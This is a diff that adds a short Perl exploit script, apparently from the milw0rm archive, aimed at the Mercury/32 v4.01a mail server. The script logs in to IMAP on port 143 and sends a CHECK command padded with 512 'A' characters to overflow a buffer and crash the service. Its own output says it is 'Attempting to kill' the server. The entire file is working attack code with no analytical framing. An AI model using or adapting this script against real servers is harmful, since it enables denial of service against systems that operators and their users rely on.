@@ -1,0 +1,40 @@
+#===== Start Mercury32_Overflow.pl =====
+#
+# Usage: Mercury32_Overflow.pl <ip> <imap4 user> <imap4 pass>
+#        Mercury32_Overflow.pl 127.0.0.1 hello moto
+#
+# Mercury/32, v4.01a, Dec 8 2003
+#
+# Download:
+# http://www.pmail.com/
+#
+#############################################################
+
+use IO::Socket;
+use strict;
+
+my($socket) = "";
+
+if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],
+                                    PeerPort => "143",
+                                    Proto    => "TCP"))
+{
+        print "Attempting to kill Mercury/32 service at $ARGV[0]:143...";
+
+        sleep(1);
+
+        print $socket "0000 LOGIN $ARGV[1] $ARGV[2]\r\n";
+
+        sleep(1);
+
+        print $socket "0001 CHECK " . "A" x 512 . "\r\n";
+
+        close($socket);
+}
+else
+{
+        print "Cannot connect to $ARGV[0]:143\n";
+}
+#===== End Mercury32_Overflow.pl =====
+
+# milw0rm.com [2004-12-01]
